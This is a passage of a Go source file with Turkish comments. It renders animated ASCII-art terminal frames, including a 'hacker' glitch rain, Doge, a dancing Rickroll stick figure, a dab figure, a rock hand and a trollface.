					colorGrid[statusRow][col] = "\033[33m"
				}
			}
			col++
		}
		break
	}
	// show the others dimmer in order
	order := []int{1, 2, 3}
	for _, i := range order {
		col += 2
		if col >= w {
			break
		}
		for _, ch := range status[i] {
			if col >= w {
				break
			}
			grid[statusRow][col] = ch
			if useColor {
				colorGrid[statusRow][col] = "\033[33m"
			}
			col++
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 10. HACKER // BINARY GLITCH RAIN (HACKER3)
// ============================================================================

var hacker3Symbols = []rune("01<>{}[]/\\$#%&*+=-_:;?!")

type Hacker3State struct {
	Width  int
	Height int
	Cols   []float64 // head y for each column
	Speeds []float64
	Trail  [][]rune
}

func NewHacker3State(w, h int) *Hacker3State {
	s := &Hacker3State{
		Width:  w,
		Height: h,
		Cols:   make([]float64, w),
		Speeds: make([]float64, w),
		Trail:  make([][]rune, h),
	}
	for i := range s.Trail {
		s.Trail[i] = make([]rune, w)
		for j := range s.Trail[i] {
			s.Trail[i][j] = ' '
		}
	}
	for x := 0; x < w; x++ {
		s.Cols[x] = -float64(rand.Intn(h))
		s.Speeds[x] = 0.4 + rand.Float64()*0.9
	}
	return s
}

func (s *Hacker3State) Update() {
	for y := 0; y < s.Height; y++ {
		for x := 0; x < s.Width; x++ {
			ch := s.Trail[y][x]
			if ch != ' ' && rand.Float32() < 0.05 {
				s.Trail[y][x] = hacker3Symbols[rand.Intn(len(hacker3Symbols))]
			}
		}
	}

	for x := 0; x < s.Width; x++ {
		s.Cols[x] += s.Speeds[x]
		head := int(s.Cols[x])
		if head >= s.Height {
			s.Cols[x] = -float64(rand.Intn(8))
			s.Speeds[x] = 0.4 + rand.Float64()*0.9
			continue
		}
		// write a bright head char
		if head >= 0 && head < s.Height {
			s.Trail[head][x] = hacker3Symbols[rand.Intn(len(hacker3Symbols))]
		}
		// fade out tail
		tail := head - 14
		if tail >= 0 && tail < s.Height {
			s.Trail[tail][x] = ' '
		}
		// occasionally inject a glitch "block" instead of a regular char
		if head >= 0 && head < s.Height && rand.Float32() < 0.04 {
			row := head
			for k := 0; k < 3 && row+k < s.Height; k++ {
				s.Trail[row+k][x] = '#'
			}
		}
	}
}

func GetHacker3Frame(tick int, w, h int, state *Hacker3State, useColor bool) (string, *Hacker3State) {
	if state == nil || state.Width != w || state.Height != h {
		state = NewHacker3State(w, h)
	}
	state.Update()

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			ch := state.Trail[y][x]
			if ch == ' ' {
				sb.WriteByte(' ')
				continue
			}
			head := int(state.Cols[x])
			dist := head - y
			if dist < 0 {
				dist = -dist
			}
			if useColor {
				if dist <= 1 {
					sb.WriteString(fmt.Sprintf("\033[1;37m%c\033[0m", ch))
				} else if dist <= 4 {
					sb.WriteString(fmt.Sprintf("\033[1;32m%c\033[0m", ch))
				} else {
					sb.WriteString(fmt.Sprintf("\033[32m%c\033[0m", ch))
				}
			} else {
				if dist <= 1 {
					sb.WriteByte('@')
				} else if dist <= 4 {
					sb.WriteByte('#')
				} else {
					sb.WriteRune(ch)
				}
			}
		}
		sb.WriteByte('\n')
	}
	return sb.String(), state
}

// ============================================================================
// 11. MEME // DOGE
// ============================================================================

func GetDogeFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	cx := w / 2
	cy := h / 2

	// Yumuşak wobble: yavaş salınım, yanıp sönme yok
	wobbleY := int(math.Round(0.6 * math.Sin(float64(tick)*0.15)))
	wobbleX := int(math.Round(0.4 * math.Sin(float64(tick)*0.10)))

	// Göz kırpma (her 60 tick'te bir)
	blinking := (tick/60)%2 == 0 && (tick%60) < 4

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			dx := x - cx + wobbleX
			dy := y - cy + wobbleY

			// Yüz çerçevesi (yuvarlak kafa)
			faceR := float64(h) * 0.32
			faceRX := faceR * 1.6
			faceRY := faceR
			nx := float64(dx) / faceRX
			ny := float64(dy) / faceRY
			faceD := nx*nx + ny*ny

			isFace := faceD <= 1.0
			isFaceBorder := faceD > 0.78 && faceD <= 1.0

			// Sol göz
			eyeDX := float64(dx+5) / 2.2
			eyeDY := float64(dy+3) / 1.6
			leftEye := eyeDX*eyeDX+eyeDY*eyeDY <= 1.0

			// Sağ göz
			rEyeDX := float64(dx-5) / 2.2
			rEyeDY := float64(dy+3) / 1.6
			rightEye := rEyeDX*rEyeDX+rEyeDY*eyeDY <= 1.0

			// Burun
			noseDX := float64(dx) / 1.4
			noseDY := float64(dy-1) / 1.0
			isNose := noseDX*noseDX+noseDY*noseDY <= 1.0

			// Ağız
			mouthDX := float64(dx) / 4.0
			mouthDY := float64(dy-4) / 0.8
			isMouth := mouthDX*mouthDX+mouthDY*mouthDY <= 1.0 && math.Abs(float64(dy-4)) < 2

			switch {
			case isFaceBorder:
				grid[y][x] = '#'
				if useColor {
					colorGrid[y][x] = "\033[1;33m"
				}
			case leftEye || rightEye:
				if blinking && (leftEye && (y-cy+wobbleY) == -3) {
					grid[y][x] = '-'
				} else {
					grid[y][x] = 'O'
				}
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			case isNose:
				grid[y][x] = 'o'
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			case isMouth:
				grid[y][x] = 'w'
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			case isFace:
				// Açık kahverengi kürk + komik "watermark" yazıları
				grid[y][x] = '·'
				if useColor {
					if (x+y+tick)%11 == 0 {
						colorGrid[y][x] = "\033[33m"
					} else {
						colorGrid[y][x] = "\033[1;33m"
					}
				}
			}
		}
	}

	// "wow", "such code", "much stream" döner yazılar (animasyonlu, alttan kayan)
	phrases := []string{"wow", "such ascii", "much stream", "very 8080", "so colorful"}
	pick := phrases[(tick/40)%len(phrases)]
	phraseX := cx - len(pick)/2 + int(2.0*math.Sin(float64(tick)*0.08))
	phraseY := h - 3
	if phraseY >= 0 && phraseY < h {
		for i, ch := range pick {
			px := phraseX + i
			if px >= 0 && px < w {
				grid[phraseY][px] = ch
				if useColor {
					colorGrid[phraseY][px] = "\033[1;33m"
				}
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}
	return sb.String()
}

// ============================================================================
// 12. MEME // ROLLING STICK FIGURE (DANCER)
// ============================================================================

func GetDancerFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]byte, h)
	for i := range grid {
		grid[i] = make([]byte, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	cx := w / 2
	cy := h / 2

	t := float64(tick)
	leanX := int(math.Round(2.0 * math.Sin(t*0.3)))
	bobY := int(math.Round(0.7 * math.Cos(t*0.6)))

	hipX := cx + leanX/2
	hipY := cy + 3 + bobY

	shoulderX := cx + leanX
	shoulderY := cy - 2 + bobY

	// gövde
	drawLine(grid, hipX, hipY, shoulderX, shoulderY, w, h, '|')
	// omuzlar
	drawLine(grid, shoulderX-2, shoulderY, shoulderX+2, shoulderY, w, h, '=')

	// kafa
	headX := shoulderX
	headY := shoulderY - 2
	if headX >= 0 && headX < w && headY >= 0 && headY < h {
		grid[headY][headX] = '@'
		if headX-1 >= 0 {
			grid[headY][headX-1] = '('
		}
		if headX+1 < w {
			grid[headY][headX+1] = ')'
		}
	}

	// kollar (dans)
	leftArmAngle := t * 0.6
	leftElbowX := shoulderX - 3 + int(math.Round(2.0*math.Cos(leftArmAngle)))
	leftElbowY := shoulderY + int(math.Round(2.0*math.Sin(leftArmAngle)))
	leftHandX := leftElbowX - 2 + int(math.Round(2.0*math.Cos(leftArmAngle*1.5)))
	leftHandY := leftElbowY + int(math.Round(2.0*math.Sin(leftArmAngle*1.5)))
	drawLine(grid, shoulderX-2, shoulderY, leftElbowX, leftElbowY, w, h, '\\')
	drawLine(grid, leftElbowX, leftElbowY, leftHandX, leftHandY, w, h, '/')

	rightArmAngle := -t * 0.6
	rightElbowX := shoulderX + 3 + int(math.Round(2.0*math.Cos(rightArmAngle)))
	rightElbowY := shoulderY + int(math.Round(2.0*math.Sin(rightArmAngle)))
	rightHandX := rightElbowX + 2 + int(math.Round(2.0*math.Cos(rightArmAngle*1.5)))
	rightHandY := rightElbowY + int(math.Round(2.0*math.Sin(rightArmAngle*1.5)))
	drawLine(grid, shoulderX+2, shoulderY, rightElbowX, rightElbowY, w, h, '/')
	drawLine(grid, rightElbowX, rightElbowY, rightHandX, rightHandY, w, h, '\\')

	// bacaklar
	stepOffset := int(math.Round(2.0 * math.Sin(t*0.5)))
	leftFootX := hipX - 3 + stepOffset
	leftFootY := h - 2
	leftKneeX := (hipX-1 + leftFootX) / 2
	leftKneeY := (hipY + leftFootY) / 2
	drawLine(grid, hipX-1, hipY, leftKneeX, leftKneeY, w, h, '/')
	drawLine(grid, leftKneeX, leftKneeY, leftFootX, leftFootY, w, h, '|')

	rightFootX := hipX + 3 - stepOffset
	rightFootY := h - 2
	rightKneeX := (hipX+1 + rightFootX) / 2
	rightKneeY := (hipY + rightFootY) / 2
	drawLine(grid, hipX+1, hipY, rightKneeX, rightKneeY, w, h, '\\')
	drawLine(grid, rightKneeX, rightKneeY, rightFootX, rightFootY, w, h, '|')

	// zemin
	for x := 0; x < w; x++ {
		if grid[h-1][x] == ' ' {
			grid[h-1][x] = '='
		}
	}

	// Lyrics
	lyrics := []string{
		"NEVER GONNA GIVE YOU UP",
		"NEVER GONNA LET YOU DOWN",
		"NEVER GONNA RUN AROUND ",
		"AND DESERT YOU          ",
	}
	lyricStr := lyrics[(tick/12)%len(lyrics)]
	lyricStartX := cx - len(lyricStr)/2
	lyricY := 2
	if lyricY >= 0 && lyricY < h {
		for i := 0; i < len(lyricStr); i++ {
			lx := lyricStartX + i
			if lx >= 0 && lx < w {
				grid[lyricY][lx] = lyricStr[i]
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		sb.Write(grid[y])
		sb.WriteByte('\n')
	}
	return sb.String()
}

// ============================================================================
// 13. MEME // DAB STICK FIGURE
// ============================================================================

func GetDabFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]byte, h)
	for i := range grid {
		grid[i] = make([]byte, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	cx := w / 2
	cy := h / 2

	// DAB döngüsü: 0-3 hold, 4-5 release
	holdPhase := (tick / 4) % 8 < 6
	if holdPhase {
		// DAB pozisyonu: bir kol yukarı, diğer yatay
		shoulderX := cx
		shoulderY := cy - 1
		hipX := cx
		hipY := cy + 4

		// gövde
		drawLine(grid, hipX, hipY, shoulderX, shoulderY, w, h, '|')

		// kafa (hafif eğik)
		headX := shoulderX + 1
		headY := shoulderY - 1
		if headX >= 0 && headX < w && headY >= 0 && headY < h {
			grid[headY][headX] = '@'
		}

		// Sol kol: dirsek yukarı, el yatay (dab)
		drawLine(grid, shoulderX, shoulderY, shoulderX-1, shoulderY-4, w, h, '/')
		drawLine(grid, shoulderX-1, shoulderY-4, shoulderX+5, shoulderY-4, w, h, '_')

		// Sağ kol: dirsek yatay yönde, el yüzü kapatıyor
		drawLine(grid, shoulderX, shoulderY, shoulderX+5, shoulderY+1, w, h, '\\')
		drawLine(grid, shoulderX+5, shoulderY+1, shoulderX+2, shoulderY+2, w, h, '/')

		// bacaklar
		drawLine(grid, hipX, hipY, hipX-2, h-2, w, h, '/')
		drawLine(grid, hipX, hipY, hipX+2, h-2, w, h, '\\')
		drawLine(grid, hipX-2, h-2, hipX-4, h-2, w, h, '_')
		drawLine(grid, hipX+2, h-2, hipX+4, h-2, w, h, '_')
	} else {
		// Geçiş: kollar aşağı
		shoulderX := cx
		shoulderY := cy - 1
		hipX := cx
		hipY := cy + 4
		drawLine(grid, hipX, hipY, shoulderX, shoulderY, w, h, '|')
		headX := shoulderX
		headY := shoulderY - 1
		if headX >= 0 && headX < w && headY >= 0 && headY < h {
			grid[headY][headX] = '@'
		}
		drawLine(grid, shoulderX, shoulderY, shoulderX-3, shoulderY+3, w, h, '\\')
		drawLine(grid, shoulderX, shoulderY, shoulderX+3, shoulderY+3, w, h, '/')
		drawLine(grid, hipX, hipY, hipX-2, h-2, w, h, '/')
		drawLine(grid, hipX, hipY, hipX+2, h-2, w, h, '\\')
	}

	for x := 0; x < w; x++ {
		if grid[h-1][x] == ' ' {
			grid[h-1][x] = '='
		}
	}

	// Başlık
	title := "DAB"
	titleX := cx - len(title)/2
	for i, ch := range title {
		tx := titleX + i
		if tx >= 0 && tx < w && 1 < h {
			grid[1][tx] = byte(ch)
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		sb.Write(grid[y])
		sb.WriteByte('\n')
	}
	return sb.String()
}

// ============================================================================
// 14. MEME // ROCK HAND
// ============================================================================

func GetRockFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	// Yumuşak pulsing
	pulse := 1.0 + 0.08*math.Sin(float64(tick)*0.2)
	cx := w / 2
	cy := h / 2

	type finger struct {
		dx, dy int
		length int
		curve  string
	}
	fingers := []finger{
		{-3, -5, 8, "/\\"}, // sol baş
		{-1, -6, 9, "|"},  // sol işaret
		{1, -6, 9, "|"},   // sağ işaret
		{3, -5, 8, "/\\"}, // sağ baş
	}

	// Avuç
	handW := int(8 * pulse)
	handH := int(10 * pulse)
	for y := -handH/2; y <= handH/2; y++ {
		for x := -handW/2; x <= handW/2; x++ {
			nx := float64(x) / float64(handW/2)
			ny := float64(y) / float64(handH/2)
			if nx*nx+ny*ny <= 1.0 {
				py := cy + y
				px := cx + x
				if px >= 0 && px < w && py >= 0 && py < h {
					grid[py][px] = '█'
					if useColor {
						// Ten rengi
						grid[py][px] = '#'
						colorGrid[py][px] = "\033[1;33m"
					}
				}
			}
		}
	}

	// Parmaklar (yukarı)
	for _, f := range fingers {
		startX := cx + f.dx
		startY := cy + f.dy
		for i := 0; i < f.length; i++ {
			fx := startX
			fy := startY - i
			if fx >= 0 && fx < w && fy >= 0 && fy < h {
				grid[fy][fx] = '│'
				if useColor {
					colorGrid[fy][fx] = "\033[1;33m"
				}
			}
		}
		// Parmak ucu
		tipY := startY - f.length
		if tipY >= 0 && tipY < h && startX >= 0 && startX < w {
			grid[tipY][startX] = '█'
			if useColor {
				colorGrid[tipY][startX] = "\033[1;33m"
			}
		}
	}

	// Başparmak (aşağı yanda)
	thumbBaseX := cx - handW/2 - 1
	thumbBaseY := cy + 1
	for i := 0; i < 5; i++ {
		tx := thumbBaseX - i
		ty := thumbBaseY + i/2
		if tx >= 0 && tx < w && ty >= 0 && ty < h {
			grid[ty][tx] = '─'
			if useColor {
				colorGrid[ty][tx] = "\033[1;33m"
			}
		}
	}

	// Bilek + kol
	for y := cy + handH/2; y < h-2; y++ {
		for x := cx - 2; x <= cx + 2; x++ {
			if x >= 0 && x < w {
				grid[y][x] = '█'
				if useColor {
					grid[y][x] = '#'
					colorGrid[y][x] = "\033[34m"
				}
			}
		}
	}

	// "ROCK ON!" yazısı
	title := "ROCK ON!"
	titleX := cx - len(title)/2
	if 2 < h {
		for i, ch := range title {
			tx := titleX + i
			if tx >= 0 && tx < w {
				grid[2][tx] = ch
				if useColor {
					colorGrid[2][tx] = "\033[1;35m"
				}
			}
		}
	}

	// Yıldız parlamalar
	stars := []struct{ x, y int }{
		{cx - 10, cy - 10},
		{cx + 10, cy - 8},
		{cx - 12, cy - 4},
		{cx + 12, cy - 4},
	}
	for _, s := range stars {
		if s.x >= 0 && s.x < w && s.y >= 0 && s.y < h {
			phase := (tick / 3) % 4
			var ch rune
			switch phase {
			case 0:
				ch = '+'
			case 1:
				ch = '*'
			case 2:
				ch = '+'
			case 3:
				ch = '.'
			}
			grid[s.y][s.x] = ch
			if useColor {
				colorGrid[s.y][s.x] = "\033[1;33m"
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}
	return sb.String()
}

// ============================================================================
// 15. MEME // TROLLFACE
// ============================================================================

func GetTrollFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	// Yavaş yaklaşma (zoom): yüz büyür
	zoom := 1.0 + 0.25*math.Sin(float64(tick)*0.08)
	cx := w / 2
	cy := h / 2

	// Yüz elips
	faceW := int(20 * zoom)
	faceH := int(14 * zoom)

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			dx := x - cx
			dy := y - cy
			nx := float64(dx) / float64(faceW)
			ny := float64(dy) / float64(faceH)
			d := nx*nx + ny*ny

			isFace := d <= 1.0
			isEdge := d > 0.88 && d <= 1.0

			switch {
			case isEdge:
				grid[y][x] = '#'
				if useColor {
					colorGrid[y][x] = "\033[1;33m"
				}
			case isFace:
				// Cilt
				grid[y][x] = '·'
				if useColor {
					colorGrid[y][x] = "\033[33m"
				}
			}

			// Gözler (kocaman, küçük nokta)
			if isFace {
				eyeX := float64(dx+6) / 3.0
				eyeY := float64(dy+3) / 2.0
				if eyeX*eyeX+eyeY*eyeY <= 1.0 {
					grid[y][x] = 'O'
					if useColor {
						colorGrid[y][x] = "\033[1;37m"
					}
				}
				rEyeX := float64(dx-6) / 3.0
				rEyeY := float64(dy+3) / 2.0
				if rEyeX*rEyeX+rEyeY*rEyeY <= 1.0 {
					grid[y][x] = 'O'
					if useColor {
						colorGrid[y][x] = "\033[1;37m"
					}
				}

				// Ağız (geniş sırıtış)
				mouthDX := float64(dx) / 8.0
				mouthDY := float64(dy-4) / 1.5
				if math.Abs(mouthDX) <= 1.0 && mouthDY >= 0 && mouthDY <= 0.5 {
					grid[y][x] = '='
					if useColor {
						colorGrid[y][x] = "\033[1;31m"
					}
				}
				// Dişler
				if mouthDY >= 0.1 && mouthDY <= 0.4 {
					grid[y][x] = '|'
					if useColor {
						colorGrid[y][x] = "\033[1;37m"
					}
				}
			}
		}
	}

	// Saç tutamları (üst kenarda zig-zag)
	for i := -faceW + 2; i < faceW-2; i += 2 {
		sx := cx + i
		if sx >= 0 && sx < w && cy-faceH >= 0 && cy-faceH < h {
			grid[cy-faceH][sx] = '/'
			grid[cy-faceH+1][sx] = '\\'
		}
	}

	// "PROBLEM?" yazısı alt kısımda
	title := "PROBLEM?"
	titleX := cx - len(title)/2
	titleY := h - 2
	if titleY >= 0 && titleY < h {
		for i, ch := range title {
			tx := titleX + i
			if tx >= 0 && tx < w {
				grid[titleY][tx] = ch
				if useColor {
					colorGrid[titleY][tx] = "\033[1;33m"
				}
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}
	return sb.String()
}
